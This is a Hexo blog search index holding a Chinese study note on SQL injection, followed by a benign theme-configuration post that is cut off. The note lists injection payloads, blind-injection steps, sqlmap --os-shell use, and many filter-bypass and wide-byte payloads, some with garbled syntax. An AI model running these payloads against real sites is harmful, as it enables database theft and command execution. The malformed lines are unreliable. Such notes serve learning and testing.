<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL注入</title>
    <url>/posts/e73517db.html</url>
    <content><![CDATA[<h1 id="sql注入介绍："><a href="#sql注入介绍：" class="headerlink" title="sql注入介绍："></a>sql注入介绍：</h1><h2 id="数据库简介："><a href="#数据库简介：" class="headerlink" title="数据库简介："></a>数据库简介：</h2><p>数据库查询和设计语言，用于存取数据以及查询；常见数据库mysql；mongodb；grepsql</p>
<h2 id="SQL语句："><a href="#SQL语句：" class="headerlink" title="SQL语句："></a>SQL语句：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 【表名】</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into user(id,username,password) values(xx,&#x27;xx&#x27;,&#x27;xx&#x27;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">    DELETE FROM 表名称 WHERE 列名称 = 值</span><br><span class="line">    DELETE * FROM 表名称</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete * from</span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">内嵌注入：</span></span><br><span class="line"><span class="string">/*!/*!*/</span></span><br><span class="line"><span class="string">/*</span> <span class="string">*/</span> <span class="string">在mysql中是多行注释</span> <span class="string">但是如果里面加了!</span> <span class="string">那么后面的内容会被执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">having where；</span><br><span class="line">区别对于不同的</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 和 group by</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三种注释：</span><br><span class="line">/&quot;&quot;/</span><br><span class="line">--+</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">describe </span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="MySQL基础："><a href="#MySQL基础：" class="headerlink" title="MySQL基础："></a>MySQL基础：</h2><h2 id="MySQL系统表："><a href="#MySQL系统表：" class="headerlink" title="MySQL系统表："></a>MySQL系统表：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">information_schema</span>	<span class="comment">#数据库</span></span><br><span class="line">	<span class="string">-.Schemata</span>	    <span class="comment">#表名</span></span><br><span class="line">		<span class="string">-shcema_name</span>  <span class="comment">#包含所有数据库名</span></span><br><span class="line">	<span class="string">-.Tables</span></span><br><span class="line">		<span class="string">-table_name</span> 	<span class="comment">#包含所有表名</span></span><br><span class="line">		<span class="string">-table_schema</span>	<span class="comment">#指定当前数据库</span></span><br><span class="line">	<span class="string">-.Columns</span></span><br><span class="line">		<span class="string">-table_schema</span> <span class="comment">#指定数据库</span></span><br><span class="line">		<span class="string">-table_name</span>   <span class="comment">#指定表</span></span><br><span class="line">		<span class="string">-column_name</span>	<span class="comment">#包含所有列名</span></span><br></pre></td></tr></table></figure>
<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><p>由于web应用程序对用户输入的数据合法性判断不严格，将恶意的sql命令注入到程序后台并在数据库中执行。</p>
<h3 id="注入危害："><a href="#注入危害：" class="headerlink" title="注入危害："></a>注入危害：</h3><p>获取敏感信息；可以使用万能密码登录网站后台；执行系统命令；文件系统操作；注册表操作；</p>
<h3 id="注入判断："><a href="#注入判断：" class="headerlink" title="注入判断："></a>注入判断：</h3><p>根据返回包的显示结果吧</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="参数类型："><a href="#参数类型：" class="headerlink" title="参数类型："></a>参数类型：</h3><p>数字型</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$sql=&quot;select</span> <span class="string">name</span> <span class="string">from</span> <span class="string">users</span> <span class="string">where</span> <span class="string">id</span> <span class="string">=1&quot;</span></span><br><span class="line"><span class="string">参数没有被引号包裹</span></span><br></pre></td></tr></table></figure>
<p>字符型</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$sql=&quot;select</span> <span class="string">name</span> <span class="string">from</span> <span class="string">users</span> <span class="string">where</span> <span class="string">id=&#x27;1&#x27;&quot;</span></span><br><span class="line"><span class="string">参数被&#x27;或是&quot;包裹起来</span></span><br></pre></td></tr></table></figure>
<p>搜索型</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$sql=&quot;select</span> <span class="string">*</span> <span class="string">from</span> <span class="string">users</span> <span class="string">where</span> <span class="string">name</span> <span class="string">like</span> <span class="string">&#x27;%tom%&#x27;</span></span><br><span class="line"><span class="string">搜索项相对字符型多了一对%</span></span><br></pre></td></tr></table></figure>
<h3 id="数据库返回结果分类："><a href="#数据库返回结果分类：" class="headerlink" title="数据库返回结果分类："></a>数据库返回结果分类：</h3><p>1.回显注入</p>
<p>2.盲注</p>
<p>3.报错注入</p>
<h3 id="注入点位置分类："><a href="#注入点位置分类：" class="headerlink" title="注入点位置分类："></a>注入点位置分类：</h3><p>1.get</p>
<p>2.post</p>
<p>3.header</p>
<p>4.cookie</p>
<p>…..等等</p>
<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><h3 id="get显错注入流程"><a href="#get显错注入流程" class="headerlink" title="get显错注入流程"></a>get显错注入流程</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.获取字段数</span> <span class="string">order</span> <span class="string">by</span></span><br><span class="line"><span class="number">2</span><span class="string">.获取显示位</span> <span class="string">union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,3....x</span></span><br><span class="line"><span class="number">3</span><span class="string">.获取数据库信息</span> <span class="string">version（）user()@@datadir</span></span><br><span class="line"><span class="number">4</span><span class="string">.获取当前数据库</span> <span class="string">database（）schema()</span></span><br><span class="line"><span class="number">5</span><span class="string">.获取所有数据库</span></span><br><span class="line"><span class="number">6</span><span class="string">.获取数据库表</span></span><br><span class="line"><span class="number">7</span><span class="string">.获取所有字段</span></span><br><span class="line"><span class="number">8</span><span class="string">.获取数据</span></span><br></pre></td></tr></table></figure>
<h3 id="盲注基本流程"><a href="#盲注基本流程" class="headerlink" title="盲注基本流程"></a>盲注基本流程</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">01</span><span class="string">、获取当前数据库长度length</span></span><br><span class="line"><span class="number">02</span><span class="string">、获取当前数据库名</span></span><br><span class="line"><span class="number">03</span><span class="string">、获取当前数据库表总数count</span></span><br><span class="line"><span class="number">04</span><span class="string">、获取当前数据库表的长度</span></span><br><span class="line"><span class="number">05</span><span class="string">、获取当前数据库表名</span></span><br><span class="line"><span class="number">06</span><span class="string">、获取当前数据库表的字段总数</span></span><br><span class="line"><span class="number">07</span><span class="string">、获取当前数据库表的字段第N个长度</span></span><br><span class="line"><span class="number">08</span><span class="string">、获取当前数据库表的字段第N个字段名</span></span><br><span class="line"><span class="number">09</span><span class="string">、获取当前数据库表的字段内容长度</span></span><br><span class="line"><span class="number">10</span><span class="string">、获取当前数据库表的字段内容</span></span><br></pre></td></tr></table></figure>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑运算符：and、or、!=</span><br><span class="line">and：并且，前后两条语句必须全为真，才为真，否则为假。</span><br><span class="line">1=1 and 2=2        真</span><br><span class="line">1=1 and 1=2     假</span><br><span class="line"></span><br><span class="line">or：或者，前后两条语句一条为真，就为真。</span><br><span class="line"></span><br><span class="line">!= ：不等于</span><br><span class="line"></span><br><span class="line">在sql语言中，and优先级大于or</span><br></pre></td></tr></table></figure>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">--+</span>     <span class="string">注释符</span></span><br><span class="line"><span class="string">limit</span> <span class="number">0</span><span class="string">,1</span>      <span class="string">从你表中的第一个数据开始，只读取一个</span></span><br><span class="line"><span class="string">order</span> <span class="string">by</span>      <span class="string">排序，判断字段数量，也就是表的列数</span></span><br><span class="line"><span class="string">union</span> <span class="string">select</span>  <span class="string">联合查询，连接前面语句，起着合并查询的作用</span></span><br><span class="line"><span class="string">group_concat</span>  <span class="string">合并多行数据到一行</span></span><br><span class="line"></span><br><span class="line"><span class="string">version()</span>    <span class="string">当前数据库版本</span></span><br><span class="line"><span class="string">database()</span>   <span class="string">当前数据库</span></span><br><span class="line"><span class="string">@@datadir</span>    <span class="string">数据库数据路径</span></span><br><span class="line"><span class="string">@@version_compile_os</span>    <span class="string">操作系统版本</span></span><br></pre></td></tr></table></figure>
<h3 id="字符截取"><a href="#字符截取" class="headerlink" title="字符截取"></a>字符截取</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">在sql里面直接执行，需要先use</span> <span class="string">【指定的数据库】；</span></span><br><span class="line"><span class="comment"># 截取结果中的值，从第一个字符开始，截取1个字符</span></span><br><span class="line"><span class="string">select</span> <span class="string">mid(database(),1,1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 截取结果中的值，从第一个字符开始，截取1个字符</span></span><br><span class="line"><span class="string">select</span> <span class="string">substr(database(),1,1)</span></span><br></pre></td></tr></table></figure>
<h3 id="计算字符的ASCII值"><a href="#计算字符的ASCII值" class="headerlink" title="计算字符的ASCII值"></a>计算字符的ASCII值</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回字符串第一个字符的 ASCII 值</span></span><br><span class="line"><span class="string">select</span> <span class="string">ascii(&#x27;hello&#x27;);</span></span><br><span class="line"><span class="string">select</span> <span class="string">ord(&#x27;hello&#x27;);</span></span><br><span class="line"><span class="string">CyberChef：加密解密</span></span><br><span class="line"><span class="comment"># 将截取出来的字符，转换成ASCII码，以便于后面做运算</span></span><br><span class="line"><span class="string">select</span> <span class="string">ascii(substr(database(),1,1));</span></span><br><span class="line"><span class="string">select</span> <span class="string">ord(substr(database(),1,1));</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果为1或者0，也就是true or false</span></span><br><span class="line"><span class="string">select</span> <span class="string">ascii(substr(database(),1,1))&gt;97;</span></span><br><span class="line"><span class="string">select</span> <span class="string">ord(substr(database(),1,1))&gt;97;</span></span><br></pre></td></tr></table></figure>
<h3 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回当前数据库长度</span></span><br><span class="line"><span class="string">select</span> <span class="string">length(database());</span></span><br></pre></td></tr></table></figure>
<h3 id="计算行数"><a href="#计算行数" class="headerlink" title="计算行数"></a>计算行数</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回查询结果行数</span></span><br><span class="line"><span class="string">select</span> <span class="string">count(username)</span> <span class="string">from</span> <span class="string">users;</span></span><br></pre></td></tr></table></figure>
<h3 id="left，right"><a href="#left，right" class="headerlink" title="left，right"></a>left，right</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回当前数据库最左边的1个字符串</span></span><br><span class="line"><span class="string">select</span> <span class="string">left(database(),1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回当前数据库最右边的1个字符串</span></span><br><span class="line"><span class="string">select</span> <span class="string">right(database(),1);</span></span><br></pre></td></tr></table></figure>
<h3 id="concat-str1-str2…-str-n"><a href="#concat-str1-str2…-str-n" class="headerlink" title="concat( str1, str2…. str n )"></a>concat( str1, str2…. str n )</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">用来连接两个字段</span></span><br><span class="line"><span class="string">和它类似的是</span></span><br><span class="line"><span class="string">concat(ch,str1,str2...strn)</span></span><br><span class="line"><span class="string">将多个字符串用ch分隔并连接起来</span></span><br></pre></td></tr></table></figure>
<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">使用group_concat()可以将多行数据合并成一行</span></span><br></pre></td></tr></table></figure>
<h2 id="实际过程之联合注入"><a href="#实际过程之联合注入" class="headerlink" title="实际过程之联合注入"></a>实际过程之联合注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.判断注入点</span><br><span class="line">#这里的&#x27;实际上是用来闭合的，如果是数字型那可能就没有，也可能是）啊什么的；字符型的话就可能是&#x27; &#x27;) &quot; &quot;) &quot;))，爱，按实际情况来就好；</span><br><span class="line">id=1&#x27; and 1=1 --+</span><br><span class="line">页面未返回内容</span><br><span class="line">id=1&#x27; and 1=2 --+</span><br><span class="line">2获取当前数据长度</span><br><span class="line">id=1&#x27; and length(database())=8--+</span><br><span class="line">3获取当前数据库</span><br><span class="line">id=1&#x27; and left((database()),1)=&#x27;s&#x27;--+</span><br><span class="line">获取第一位，第二位....第八位</span><br><span class="line">4获取当前数据库总表数</span><br><span class="line">id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=4--+</span><br><span class="line">5获取数据表的长度</span><br><span class="line"># 第一个数据库表长度</span><br><span class="line">id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6--+</span><br><span class="line"></span><br><span class="line"># 第二个数据库表长度</span><br><span class="line">id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=8--+</span><br><span class="line">6获取当前数据库下的表名</span><br><span class="line">id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="实际过程之报错注入"><a href="#实际过程之报错注入" class="headerlink" title="实际过程之报错注入"></a>实际过程之报错注入</h2><h2 id="实际过程之盲注入"><a href="#实际过程之盲注入" class="headerlink" title="实际过程之盲注入"></a>实际过程之盲注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.判断注入点</span><br><span class="line">id=1&#x27; and 1=1 --+</span><br><span class="line">id=1&#x27; and 1=2 --+</span><br><span class="line">2.获取当前数据库长度（8）</span><br><span class="line">id=1&#x27; and length(database())=8--+</span><br><span class="line">3.获取当前数据库名字（security）</span><br><span class="line">id=1&#x27; and left((database()),1)=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure>
<h2 id="SQLMAP-—os-shell原理"><a href="#SQLMAP-—os-shell原理" class="headerlink" title="SQLMAP —os-shell原理"></a>SQLMAP —os-shell原理</h2><p>必要条件：1.拥有写入权限；2.secure_file_priv参数为空或者为指定路径</p>
<p>普通注入—os-shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行</p>
<p>SQLMAP检测注入</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">python</span> <span class="string">sqlmap.py</span> <span class="string">--os-shell</span></span><br></pre></td></tr></table></figure>
<h2 id="绕过空格（注释符-，-a0）："><a href="#绕过空格（注释符-，-a0）：" class="headerlink" title="绕过空格（注释符/ /，%a0）："></a>绕过空格（注释符/<em> </em>/，%a0）：</h2><p>两个空格代替一个空格，用Tab代替空格，%a0=空格：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%20%09%0a</span> <span class="string">%0b</span> <span class="string">%0c</span> <span class="string">%0d</span> <span class="string">%a0/**/</span></span><br></pre></td></tr></table></figure>
<p>最基本的绕过方法，用注释替换空格：</p>
<p>/<em>注释</em>/</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4d3b339fd774e21dbdb1b1e436d82e44.webp" alt="img"></p>
<h2 id="括号绕过空格："><a href="#括号绕过空格：" class="headerlink" title="括号绕过空格："></a>括号绕过空格：</h2><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>例如：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select(user())fromdualwhere(1=1)and(2=2)</span></span><br></pre></td></tr></table></figure>
<p>这种过滤方法常常用于time based盲注,例如：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span></span><br></pre></td></tr></table></figure>
<p>（from for属于逗号绕过下面会有）</p>
<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
<h2 id="引号绕过（使用十六进制）："><a href="#引号绕过（使用十六进制）：" class="headerlink" title="引号绕过（使用十六进制）："></a>引号绕过（<strong>使用十六进制</strong>）：</h2><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">selectcolumn_namefrominformation_schema.tableswheretable_name=&quot;users&quot;</span></span><br></pre></td></tr></table></figure>
<p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。</p>
<p>users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273</span></span><br></pre></td></tr></table></figure>
<h2 id="逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）："><a href="#逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）：" class="headerlink" title="逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）："></a>逗号绕过（limit<strong>使用from或者offset</strong>）（substr使用from for属于逗号）：</h2><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select</span> <span class="string">substr(database(0from1for1);select</span> <span class="string">mid(database(0from1for1);</span></span><br></pre></td></tr></table></figure>
<p>对于limit可以使用offset来绕过：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select*fromnews</span> <span class="string">limit0,1</span>	<span class="comment"># 等价于下面这条SQL语句</span></span><br><span class="line"><span class="string">select*fromnews</span> <span class="string">limit1offset0</span></span><br></pre></td></tr></table></figure>
<h2 id="比较符号（-lt-gt-）绕过（使用greatest-）："><a href="#比较符号（-lt-gt-）绕过（使用greatest-）：" class="headerlink" title="比较符号（&lt;&gt;）绕过（使用greatest()）："></a>比较符号（&lt;&gt;）绕过（<strong>使用greatest()</strong>）：</h2><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。</p>
<p>最常见的一个盲注的sql语句：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select</span> <span class="string">*</span> <span class="string">from</span> <span class="string">users</span> <span class="string">where</span> <span class="string">id=1</span> <span class="string">and</span> <span class="string">ascii(substr(database(),0,1))&gt;64</span></span><br></pre></td></tr></table></figure>
<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select*fromuserswhereid=1and</span> <span class="string">greatest(ascii(substr(database(),0,1)),64)=64</span></span><br></pre></td></tr></table></figure>
<h2 id="or-and-绕过："><a href="#or-and-绕过：" class="headerlink" title="or and 绕过："></a>or and 绕过：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">and=&amp;&amp;</span> <span class="string">or=||</span></span><br></pre></td></tr></table></figure>
<h2 id="绕过注释符号（-，—）过滤："><a href="#绕过注释符号（-，—）过滤：" class="headerlink" title="绕过注释符号（#，—）过滤："></a>绕过注释符号（#，—）过滤：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=1&#x27;union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,3||&#x27;1</span></span><br></pre></td></tr></table></figure>
<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=1&#x27;union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,&#x27;3</span></span><br></pre></td></tr></table></figure>
<h2 id="绕过："><a href="#绕过：" class="headerlink" title="=绕过："></a>=绕过：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">使用like</span> <span class="string">或者</span> <span class="string">使用&lt;</span> <span class="string">或者</span> <span class="string">&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a>绕过union，select，where等：</h2><h3 id="（1）使用注释符绕过："><a href="#（1）使用注释符绕过：" class="headerlink" title="（1）使用注释符绕过："></a>（1）使用注释符绕过：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">常用注释符：</span></span><br><span class="line"><span class="string">//，--</span> <span class="string">,</span> <span class="string">/**/,</span> <span class="comment">#, --+, -- -, ;,%00,--a</span></span><br><span class="line"><span class="string">用法：</span></span><br><span class="line"><span class="string">U/**/NION/**/SE/**/LECT/**/user，pwd</span> <span class="string">from</span> <span class="string">user</span></span><br></pre></td></tr></table></figure>
<h3 id="（2）使用大小写绕过："><a href="#（2）使用大小写绕过：" class="headerlink" title="（2）使用大小写绕过："></a>（2）使用大小写绕过：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=-1&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
<h3 id="（3）内联注释绕过："><a href="#（3）内联注释绕过：" class="headerlink" title="（3）内联注释绕过："></a>（3）内联注释绕过：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=-1&#x27;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/)</span> <span class="string">FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like</span> <span class="string">database()#</span></span><br></pre></td></tr></table></figure>
<h3 id="（4）-双关键字绕过："><a href="#（4）-双关键字绕过：" class="headerlink" title="（4） 双关键字绕过："></a>（4） 双关键字绕过：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span></span><br></pre></td></tr></table></figure>
<h2 id="通用绕过（编码）："><a href="#通用绕过（编码）：" class="headerlink" title="通用绕过（编码）："></a>通用绕过（编码）：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">如URLEncode编码，ASCII,HEX,unicode编码绕过：</span></span><br><span class="line"><span class="string">or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span></span><br></pre></td></tr></table></figure>
<h2 id="等价函数绕过："><a href="#等价函数绕过：" class="headerlink" title="等价函数绕过："></a>等价函数绕过：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">hex()、bin()==&gt;ascii()</span></span><br><span class="line"></span><br><span class="line"><span class="string">sleep()==&gt;benchmark()</span></span><br><span class="line"></span><br><span class="line"><span class="string">concat_ws()==&gt;group_concat()</span></span><br><span class="line"></span><br><span class="line"><span class="string">mid()、substr()==&gt;substring()</span> <span class="string">@@user==&gt;user()</span> <span class="string">@@datadir==&gt;datadir()</span></span><br><span class="line"></span><br><span class="line"><span class="string">举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74或者：</span></span><br><span class="line"></span><br><span class="line"><span class="string">substr((select&#x27;password&#x27;),1,1)=0x70strcmp(left(&#x27;password&#x27;,1),0x69)=1strcmp(left(&#x27;password&#x27;,1),0x70)=0strcmp(left(&#x27;password&#x27;,1),0x71)=-1</span></span><br></pre></td></tr></table></figure>
<h2 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h2><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为/ \’ 。</p>
<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=-1%df%27union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,user(),3--+</span></span><br></pre></td></tr></table></figure>
<p>（2）将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
<p>一般产生宽字节注入的PHP函数：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="string">replace（）：过滤</span> <span class="string">&#x27; \ ，将 &#x27;</span> <span class="string">转化为</span> <span class="string">\&#x27;</span> <span class="string">，将</span> <span class="string">\</span>  <span class="string">转为</span> <span class="string">\\，将</span> <span class="string">&quot; 转为 \&quot; 。用思路一。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：&#x27; , &quot;</span> <span class="string">,</span> <span class="string">\</span> <span class="string">。用思路一</span></span><br><span class="line"></span><br><span class="line"><span class="string">（防御此漏洞，要将</span> <span class="string">mysql_query</span> <span class="string">设置为</span> <span class="string">binary</span> <span class="string">的方式）</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span><span class="string">mysql_real_escape_string()：转义下列字符：</span></span><br><span class="line"></span><br><span class="line"><span class="string">\x00</span>  <span class="string">\n</span>  <span class="string">\r</span>  <span class="string">\&#x27;&quot;</span>  <span class="string">\x1a</span></span><br><span class="line"></span><br><span class="line"><span class="string">（防御，将mysql设置为gbk即可）</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>butterfly主题配置日记</title>
    <url>/posts/fb0904d.html</url>
    <content><![CDATA[<h1 id="butterfly-配置"><a href="#butterfly-配置" class="headerlink" title="butterfly 配置"></a>butterfly 配置</h1><h2 id="1-网站资料"><a href="#1-网站资料" class="headerlink" title="1.网站资料"></a>1.网站资料</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">蓝涴</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;可可爱爱，没有脑袋&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;爱好蓝色desu&#x27;</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">&#x27;渗透,hack&#x27;</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Lanyuan</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">email:</span> </span><br></pre></td></tr></table></figure>
<h2 id="2-导航栏设置"><a href="#2-导航栏设置" class="headerlink" title="2.导航栏设置"></a>2.导航栏设置</h2><h3 id="2-1-参数设置："><a href="#2-1-参数设置：" class="headerlink" title="2-1 参数设置："></a>2-1 参数设置：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="attr">logo:</span> <span class="comment">#image 网站logo图片，</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span> <span class="comment">#是否显示网站标题</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span> <span class="comment"># fixed navigation bar 是否固定状态栏</span></span><br></pre></td></tr></table></figure>
<h3 id="2-2-菜单目录："><a href="#2-2-菜单目录：" class="headerlink" title="2-2 菜单目录："></a>2-2 菜单目录：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">Home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">追番:</span> <span class="string">/bangumis/index.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">留言板:</span> <span class="string">/comments/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="comment"># Archives: /archives/ || fas fa-archive</span></span><br><span class="line">  <span class="comment"># Tags: /tags/ || fas fa-tags</span></span><br><span class="line">  <span class="comment"># Categories: /categories/ || fas fa-folder-open</span></span><br><span class="line">  <span class="comment"># List||fas fa-list ||hide:</span></span><br><span class="line">  <span class="comment">#   